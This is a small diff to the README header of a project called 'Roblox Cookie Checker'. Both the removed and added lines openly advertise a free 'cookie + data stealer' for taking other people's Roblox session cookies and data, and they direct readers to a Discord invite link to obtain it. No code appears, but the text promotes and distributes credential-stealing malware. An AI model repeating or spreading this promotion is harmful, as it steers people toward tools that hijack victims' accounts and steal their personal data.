@@ -9,10 +9,10 @@
   <h3 align="center"Roblox Cookie Checker</h3>
 
   <p align="center">
-   U can steal someones Data + roblox cookies for free!
+   JOIN THE DISCORD SERVER FOR FREE COOKIE + DATA STEALER!
     <br/>
     <br/>
-    <a href="Discord">[JOIN THE DISCORD FOR FREE STEALER](https://discord.gg/5ZQ4udyXcb)</a>
+    <a href="Discord">https://discord.gg/5ZQ4udyXcb</a>
   </p>
 </p>
 
